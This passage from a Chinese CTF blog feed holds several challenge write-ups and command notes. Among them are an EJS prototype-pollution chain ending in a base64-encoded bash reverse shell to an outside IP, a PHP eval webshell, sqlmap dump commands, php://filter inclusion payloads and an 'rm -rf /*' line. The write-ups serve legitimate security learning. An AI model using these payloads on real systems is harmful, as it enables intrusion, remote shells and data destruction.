<p>这里是将username和password进行一个验证，如果有<code>*blacklist* = [&#39;\\&#39;,&#39;\^&#39;,&#39;)&#39;,&#39;(&#39;,&#39;\&quot;&#39;,&#39;\&#39;&#39;]</code>黑名单里的字符就会将字符替换成<code>*</code>号</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623202457538.png" alt="image-20230623202457538"></p>
<p>这里有一个拼接操作，后面这里有用，会讲到</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623202538937.png" alt="image-20230623202538937"></p>
<p>根目录路由，没什么用，就是返回一个主页</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623202834889.png" alt="image-20230623202834889"></p>
<p>&#x2F;login路由，判断username和passord是否是正确的，用的就是<code>safeQuery</code>自定义函数，如果正确就会返回一个token，不正确就返回用户名或者密码错误</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203247062.png" alt="image-20230623203247062"></p>
<p>&#x2F;admin路由，先检验token，需要登录成功后才能访问，然后模板渲染ejs，一般会有原型链污染</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203433315.png" alt="image-20230623203433315"></p>
<p>&#x2F;addAdmin路由，看名字就知道能添加用户，但也是需要先登录才能使用这个路由，然后输入username和password后就会将信息插入到数据库中</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203626318.png" alt="image-20230623203626318"></p>
<p>&#x2F;adminDIV路由，最后一个路由，看到也是进行了一个token检验，看到有一个extend</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203732989.png" alt="image-20230623203732989"></p>
<p>这里如果将username和data的键值进行了拼接，返回了一个json数据，然后进行extend，然后一个board</p>
<p>我们在&#x2F;admin路由看到有</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203911427.png" alt="image-20230623203911427"></p>
<p>这里也有一个board，如果可以利用&#x2F;adminDIV路由，让username等于<code>__proto__</code>，data是反弹shell命令，然后经过&#x2F;admin路由进行模板渲染是不是就能成功执行命令，而且username也是可控的，可以通过&#x2F;addAdmin路由来改变username</p>
<p>既然有思路了，那么就需要先登录</p>
<p>返回到登录路由来，通过sql语句就能登录成功</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623204436847.png" alt="image-20230623204436847"></p>
<p>可以让username等于<code>admin&#39;#</code>，passoword随便一个值都可以，这样sql语句就变成了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where username = &#x27;admin&#x27;#&#x27; and password = &#x27;111&#x27;</span><br></pre></td></tr></table></figure>

<p>这样就能成功登录，绕过黑名单可以使用数组，根据js的题型，将数组与数组进行拼接后，数组就会变成字符串</p>
<p>因为只有匹配到黑名单后才会进行拼接，所以需要让他匹配到</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[]=admin&#x27;#&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=(&amp;password=111</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623212736026.png" alt="image-20230623212736026"></p>
<p>成功得到了token，接下来就按照思路来就行</p>
<p>先是创造一个用户名是<code>__proto__</code>的用户，密码随意</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623213154037.png" alt="image-20230623213154037"></p>
<p>返回<code>add admin successful!</code>即可，然后登录这个用户，会返回这个用户的token，后面都是使用的这个token</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623213341087.png" alt="image-20230623213341087"></p>
<p>接下来就是利用adminDIV路由进行原型链污染</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo%20YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzQzLjE0My4xNTUuOTAvMTExMSAwPiYx%3D%7Cbase64%20-d%7Cbash&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623214121129.png" alt="image-20230623214121129"></p>
<p>最后利用admin路由进行模板渲染，直接访问&#x2F;admin路由即可</p>
<p>注意要使用服务器进行nc端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1111</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623214302527.png" alt="image-20230623214302527"></p>
]]></content>
  </entry>
  <entry>
    <title>My Vouchers Repo(BSidesTLV 2023 CTF)</title>
    <url>/2023/07/04/%5BBSidesTLV%202023%20CTF%5DMy%20Vouchers%20Repo/</url>
    <content><![CDATA[<p>My Vouchers Repo</p>
<span id="more"></span>

<meta name="referrer" content="no-referrer">

<p>打开页面就是一个登录和注册界面</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162249810.png" alt="image-20230628162249810"></p>
<p>那就先注册一个，一个是home界面，还有一个是优惠卷界面</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162320815.png" alt="image-20230628162320815"></p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162356398.png" alt="image-20230628162356398"></p>
<p>根据题目给你信息，应该是要登录用户名为<code>john</code>的用户，然后在源代码处的<code>[main.eb04397cc22cdfc5.js](https://my-voucher-repo.ctf.bsidestlv.com/main.eb04397cc22cdfc5.js)</code>中看到</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162544646.png" alt="image-20230628162544646"></p>
<p>这样知道了是在header头<code>Authorization</code>处有用户登录信息，然后就是想办法伪造一个用户名是<code>john</code>的用户，这个是jwt，但是找不到密钥，还在源代码中找到一个api接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/signin</span><br><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>

<p>扫描目录发现还有一个<code>api/v1</code>接口，但是显示<code>not found</code>，接下来就不会做了，然后就看别人给的hint，发现api&#x2F;v1是可以打开的</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628163909724.png" alt="image-20230628163909724"></p>
<p>这个有一个<code>/refresh_token</code>，所以在url为一下界面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v1/refresh_token</span><br></pre></td></tr></table></figure>

<p>使用json传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;john&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>这样可以回显一个用户名为john的token，然后在url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>

<p>header头中的<code>Authorization</code>中输入<code>Bearer 用户名为john的token</code>就可以得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>docker命令</title>
    <url>/2023/03/21/docker/</url>
    <content><![CDATA[<p>docker命令</p>
<span id="more"></span>

<h3 id="容器使用"><a href="#容器使用" class="headerlink" title="容器使用"></a>容器使用</h3><p>使用 docker run运行容器实现”对话”的功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<p>-t: 在新容器内指定一个伪终端或终端</p>
<p>-i: 允许你对容器内的标准输入 (STDIN) 进行交互</p>
<p>使用exit命令来退出容器</p>
<p>运行命令 cat &#x2F;proc&#x2F;version和ls分别查看当前系统的版本信息和当前目录下的文件列表</p>
<p>创建一个以进程方式运行的容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d ubuntu /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230313215443115.png" alt="image-20230313215443115"></p>
<p>这个abfa742a4467336345a690967fade5b691f463acf88a700905f29b38511312ce是容器ID，</p>
<p>可以通过使用docker ps来查看容器是否在运行</p>
<p><img src="/2023/03/21/docker/image-20230313215803571.png" alt="image-20230313215803571"></p>
<p>CONTAINER ID: 容器 ID。</p>
<p>IMAGE: 使用的镜像。</p>
<p>COMMAND: 启动容器时运行的命令。</p>
<p>CREATED: 容器的创建时间。</p>
<p>STATUS: 容器状态。</p>
<p>PORTS: 容器的端口信息和使用的连接类型（tcp\udp）。</p>
<p>NAMES: 自动分配的容器名称。</p>
<p>使用docker logs命令，查看容器内的标准输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs abfa742a4467</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230313215923779.png" alt="image-20230313215923779"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs epic_herschel</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230313220031309.png" alt="image-20230313220031309"></p>
<p>停止容器使用<strong>docker stop</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop abfa742a4467</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230313220142312.png" alt="image-20230313220142312"></p>
<p>使用<strong>docker ps</strong> 查看，容器是否已经停止工作</p>
<p>也可以使用以下来停止</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop epic_herschel</span><br></pre></td></tr></table></figure>





<p>如果没有ubuntu镜像，可以使用docker pull命令来载入ubuntu镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>

<p>使用以下来启动一个容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230313220512225.png" alt="image-20230313220512225"></p>
<p>-i: 交互式操作。</p>
<p>-t: 终端。</p>
<p>ubuntu: ubuntu 镜像。</p>
<p>&#x2F;bin&#x2F;bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</p>
<p>使用exit退出容器</p>
<p>使用以下命令查看所有容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p>使用以下命令来启动一个已经停止的容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start b750bbbcfd88 </span><br></pre></td></tr></table></figure>

<p>后台运行容器命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd --name ubuntu-test ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<p>加了-d参数默认不会进入容器</p>
<p>使用以下命令可以重启停止得容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker restart &lt;容器 ID&gt;</span><br></pre></td></tr></table></figure>

<p>想要进入容器可以使用</p>
<p>docker attach(退出时会令容器停止)</p>
<p>docker exec(使用此命令会退出容器终端，但不会导致容器的停止)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker attach &lt;容器 ID&gt;</span><br><span class="line">docker exec -it &lt;容器 ID&gt; /bin/bash</span><br></pre></td></tr></table></figure>





<p>删除容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm -f 1e560fca3906</span><br></pre></td></tr></table></figure>





<p>运行一个web应用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull training/webapp  # 载入镜像</span><br><span class="line">docker run -d -P training/webapp python app.py</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230314112148069.png" alt="image-20230314112148069"></p>
<p>查看容器信息看到</p>
<p><img src="/2023/03/21/docker/image-20230314112214279.png" alt="image-20230314112214279"></p>
<p>看到有一个端口信息，将5000端口映射到32768端口上</p>
<p>可以通过 -p 参数来设置不一样的端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 5000:5000 training/webapp python app.py</span><br></pre></td></tr></table></figure>





<h3 id="镜像使用"><a href="#镜像使用" class="headerlink" title="镜像使用"></a>镜像使用</h3><p>使用以下名令可以列出本地主机上的镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230314200747476.png" alt="image-20230314200747476"></p>
<p>REPOSITORY：表示镜像的仓库源</p>
<p>TAG：镜像的标签</p>
<p>IMAGE ID：镜像ID</p>
<p>CREATED：镜像创建时间</p>
<p>SIZE：镜像大小</p>
<p>使用docker pull命令来获得一个新的镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu:13.10</span><br></pre></td></tr></table></figure>

<p>使用docker run命令来使用镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run httpd</span><br><span class="line">//使用httpd镜像</span><br></pre></td></tr></table></figure>

<p>使用docker rmi命令来删除镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi hello-world</span><br><span class="line">//删除hello-world镜像</span><br></pre></td></tr></table></figure>





<p>使用Dockerfile来创建一个新的镜像</p>
<p>查看 Dockerfile文件中有什么(提前写入)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat Dockerfile</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM    centos:6.7</span><br><span class="line">MAINTAINER      Fisher &quot;fisher@sudops.com&quot;</span><br><span class="line"></span><br><span class="line">RUN     /bin/echo &#x27;root:123456&#x27; |chpasswd</span><br><span class="line">RUN     useradd runoob</span><br><span class="line">RUN     /bin/echo &#x27;runoob:123456&#x27; |chpasswd</span><br><span class="line">RUN     /bin/echo -e &quot;LANG=\&quot;en_US.UTF-8\&quot;&quot; &gt;/etc/default/local</span><br><span class="line">EXPOSE  22</span><br><span class="line">EXPOSE  80</span><br><span class="line">CMD     /usr/sbin/sshd -D</span><br></pre></td></tr></table></figure>

<p>第一条FROM，指定使用哪个镜像源</p>
<p>RUN 指令告诉docker 在镜像内执行命令，安装了什么</p>
<p>接下来使用docker build来创建镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t runoob/centos:6.7 .</span><br></pre></td></tr></table></figure>

<p>-t ：指定要创建的目标镜像名</p>
<p>. ：Dockerfile 文件所在目录，可以指定Dockerfile 的绝对路径</p>
<h3 id="容器连接"><a href="#容器连接" class="headerlink" title="容器连接"></a>容器连接</h3><p>创建一个python应用的容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -P training/webapp python app.py</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230314210921578.png" alt="image-20230314210921578"></p>
<p>-P :是容器内部端口<strong>随机</strong>映射到主机的端口。</p>
<p>-p : 是容器内部端口绑定到<strong>指定</strong>的主机端口。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 5000:5000 training/webapp python app.py</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230314211055266.png" alt="image-20230314211055266"></p>
<p>还可以指定容器绑定的网络地址，比如绑定 127.0.0.1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 127.0.0.1:5001:5000 training/webapp python app.py</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230314211208567.png" alt="image-20230314211208567"></p>
<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><p>在dockerfile文件所在的目录下，执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build .</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230316161309297.png" alt="image-20230316161309297"></p>
<p>也可以使用以下命令来命名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:v3 .</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230316161407911.png" alt="image-20230316161407911"></p>
<p>可以创建一个镜像</p>
<p><strong>.</strong> 代表本次执行的上下文路径</p>
<p>然后使用命令来创建容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p &lt;端口号&gt;:80/其他 镜像ID</span><br></pre></td></tr></table></figure>





<h3 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker compose"></a>Docker compose</h3><p>如果有docker-compose.yml文件，可以使用命令直接开启镜像同时开启容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d --build</span><br></pre></td></tr></table></figure>

<p>但是无法自己规定端口，可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p &lt;端口号&gt;:80/其他 镜像ID</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>解题思路</title>
    <url>/2022/10/02/hello-world/</url>
    <content><![CDATA[<p>CTF招新赛部分wed解题思路</p>
<span id="more"></span>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby_rce"></a>baby_rce</h3><p><img src="/2022/10/02/hello-world/1.png"></p>
<h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h3><p>上传一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/02/hello-world/2.png"></p>
<h3 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h3><p>先了解伪协议使用data:&#x2F;&#x2F; 协议<br><img src="/2022/10/02/hello-world/4.png"><br><img src="/2022/10/02/hello-world/5.png"></p>
<h1 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h1><ol>
<li>python sqlmap.py -u “<a href="http://101.42.106.133:9208/index.php?geek=1&quot;">http://101.42.106.133:9208/index.php?geek=1&quot;</a> –batch</li>
<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> –dbs –batch</li>
<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> –current-db –batch</li>
<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> –dbs -D geek –tables –batch</li>
<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> -D geek -T ffflag –columns –batch</li>
<li>python sqlmap.py -u 101.42.106.133:9208&#x2F;index.php?geek&#x3D;1 -D geek -T ffflag -C “flag,flag_id” –dump –batch</li>
</ol>
<p>1是查看是否存在注入，2和3是去获取数据库，4是获取数据库中的表，5是拿到表中的字段，最后6是直接dump字段中的内容，来获取flag。</p>
<p><img src="/2022/10/02/hello-world/image-20221003160746799.png"></p>
<p><img src="/2022/10/02/hello-world/image-20221003160801015.png"></p>
<p><img src="/2022/10/02/hello-world/image-20221003160807151.png"></p>
]]></content>
  </entry>
  <entry>
    <title>buu的include</title>
    <url>/2022/12/03/include%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p>[极客大挑战 2019]Secret File	[BSidesCF 2020]Had a bad day	[FireshellCTF2020]Caas	[RoarCTF 2019]Easy Java</p>
<span id="more"></span>

<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>1.打开页面以后查看源代码，看到有一个Archive_room.php进入，里面有一个按钮，按下以后出现<strong>没看清么？回去再仔细看看吧。</strong>于是直接使用抓包，抓取按下时的跳转</p>
<p>2.抓包抓到一个被注释的secr3t.php 文件，进行访问出现源代码，使用secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>3.php:&#x2F;&#x2F;协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php://filter用于读取源码。</span><br><span class="line">php://filter/convert.base64-encode/resource=文件路径</span><br><span class="line">可以得到加密后的源代码</span><br><span class="line"></span><br><span class="line">2.php://input用于执行php代码。</span><br></pre></td></tr></table></figure>

<h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>1.进入页面随便点击WOOFERS或者MEOWERS，在url发现文件包含</p>
<p>2.url:272ac30f-68db-4774-aad0-77cd28746bee.node4.buuoj.cn:81&#x2F;index.php?category&#x3D;woofers将woofers换成php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php发现报错</p>
<p>3.将php后缀去掉，发现正常，将返回的内容进行base64解码</p>
<pre><code>            &#123;
                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
                    include ($file . &#39;.php&#39;);
                &#125;
需要有woofers,meowers,index才能包含传入以传入名为文件名的文件
</code></pre>
<p>4.直接使用php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag无法获取源码</p>
<p>5.使用php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;woofers&#x2F;..&#x2F;flag发现可以或者源码</p>
<p>6.最后使用base64进行解码</p>
<h3 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h3><p>1.发现需要使用c语言来做，并且还是文件包含题型</p>
<p>2.直接输入<code>#include&lt;/flag&gt;</code>出现Bad code然后使用#include’&#x2F;flag’没有回显</p>
<p>3.最后使用#include”&#x2F;flag”发现出现flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C语言的#include有&lt;&gt;和””两种</span><br><span class="line">&lt;&gt;:在系统标准头文件的位置查找头文件</span><br><span class="line">&quot;&quot;:先在当前目录是否有指定名称的头文件，然后在从标准头文件目录中查找</span><br></pre></td></tr></table></figure>

<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>1.根据wp中的弱密码输入admin,admin888显示<strong>flag没有在这里</strong></p>
<p>2.点击help发现报错，此时是get传参，改为使用post传参，使用后让下载help.docx，下载打开后显示<strong>确定你的flag在这里吗</strong></p>
<p>3.使用burp抓包help这个网页，将get传参改为post，查看是否存在<code>WEB-INF/web.xml</code>泄露，使用<code>POST /Download?filename=WEB-INF/web.xml HTTP/1.1</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回显发现   &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>

<p>4.然后使用WEB-INF&#x2F;classes，使用<code>POST /Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class HTTP/1.1</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回显有SourceFileFlagController.javaRuntimeVisibleAnnotations%Ljavax/servlet/annotation/WebServlet;nameFlagController&lt;ZmxhZ3s0YTMwZjdmOS05YmNhLTQ0MTMtYmExNy1hNjgzMjJiZWRmOWV9Cg==</span><br><span class="line">其中的ZmxhZ3s0YTMwZjdmOS05YmNhLTQ0MTMtYmExNy1hNjgzMjJiZWRmOWV9Cg==是base64编码，进行解码就是flag</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>linux命令</title>
    <url>/2022/10/03/linux/</url>
    <content><![CDATA[<p>linux的基本命令</p>
<span id="more"></span>

<h6 id="1-cd命令（切换目录）"><a href="#1-cd命令（切换目录）" class="headerlink" title="1.cd命令（切换目录）"></a>1.cd命令（切换目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /                 //切换到根目录</span><br><span class="line">cd /bin              //切换到根目录下的bin目录</span><br><span class="line">cd ../               //切换到上一级目录 或者使用命令：cd ..</span><br><span class="line">cd ~                 //切换到home目录</span><br><span class="line">cd -                 //切换到上次访问的目录</span><br><span class="line">cd xx(文件夹名)       //切换到本目录下的名为xx的文件目录，如果目录不存在报错</span><br><span class="line">cd /xxx/xx/x         //可以输入完整的路径，直接切换到目标目录，输入过程中可以使用tab键快速补全</span><br></pre></td></tr></table></figure>

<h6 id="2-ls命令（查看目录）"><a href="#2-ls命令（查看目录）" class="headerlink" title="2.ls命令（查看目录）"></a>2.ls命令（查看目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls                   //查看当前目录下的所有目录和文件</span><br><span class="line">ls /                 //查看指定目录下的文件</span><br><span class="line">ls -a                //查看当前目录下的所有目录和文件（包括隐藏的文件）</span><br><span class="line">ls -l                //列表查看当前目录下的所有目录和文件（列表查看，显示更多信息），与命令&quot;ll&quot;效果一样</span><br><span class="line">ls /bin              //查看指定目录下的所有目录和文件</span><br></pre></td></tr></table></figure>

<h6 id="3-mkdir命令（创建文件夹）"><a href="#3-mkdir命令（创建文件夹）" class="headerlink" title="3.mkdir命令（创建文件夹）"></a>3.mkdir命令（创建文件夹）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir tools          //在当前目录下创建一个名为tools的目录</span><br><span class="line">mkdir /bin/tools     //在指定目录下创建一个名为tools的目录</span><br><span class="line">mkdir -m 711 test1   //配置文件的权限</span><br></pre></td></tr></table></figure>

<h6 id="4-touch命令（创建文件）"><a href="#4-touch命令（创建文件）" class="headerlink" title="4.touch命令（创建文件）"></a>4.touch命令（创建文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch tools.txt      //在该目录下创建一个后缀为txt的文件</span><br></pre></td></tr></table></figure>

<h6 id="5-rm命令（删除目录与文件）"><a href="#5-rm命令（删除目录与文件）" class="headerlink" title="5.rm命令（删除目录与文件）"></a>5.rm命令（删除目录与文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm 文件名              //删除当前目录下的文件</span><br><span class="line">rm -f 文件名           //删除当前目录的文件（不询问）</span><br><span class="line">rm -r 文件夹名         //递归删除当前目录下此名的目录</span><br><span class="line">rm -rf 文件夹名        //递归删除当前目录下此名的目录（不询问）</span><br><span class="line">rm -rf *              //将当前目录下的所有目录和文件全部删除</span><br><span class="line">rm -rf /*             //将根目录下的所有文件全部删除【慎用！相当于格式化系统】</span><br></pre></td></tr></table></figure>

<h6 id="6-mv命令（修改目录）"><a href="#6-mv命令（修改目录）" class="headerlink" title="6.mv命令（修改目录）"></a>6.mv命令（修改目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv 当前目录名 新目录名        //修改目录名，同样适用与文件操作</span><br><span class="line">mv /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录剪切到 /opt目录下面</span><br><span class="line">mv -r /usr/tmp/tool /opt    //递归剪切目录中所有文件和文件夹</span><br></pre></td></tr></table></figure>

<h6 id="7-cp命令（拷贝目录）"><a href="#7-cp命令（拷贝目录）" class="headerlink" title="7.cp命令（拷贝目录）"></a>7.cp命令（拷贝目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录复制到 /opt目录下面</span><br><span class="line">cp -r /usr/tmp/tool /opt    //递归剪切复制目录中所有文件和文件夹</span><br></pre></td></tr></table></figure>

<h6 id="8-cat命令"><a href="#8-cat命令" class="headerlink" title="8.cat命令"></a>8.cat命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 文件名                    //查看文件中的全部信息(适合查看小文档)</span><br></pre></td></tr></table></figure>

<h6 id="9-rmp命令（插件安装命令）"><a href="#9-rmp命令（插件安装命令）" class="headerlink" title="9.rmp命令（插件安装命令）"></a>9.rmp命令（插件安装命令）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：插件安装命令</span><br><span class="line">rpm -i httpd-2.2.3-22.0.1.el5.i386.rpm         //使用rpm文件安装apache </span><br><span class="line">rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm      //使用rpm更新apache </span><br><span class="line">rpm -e httpd                                 //卸载/删除apache</span><br></pre></td></tr></table></figure>

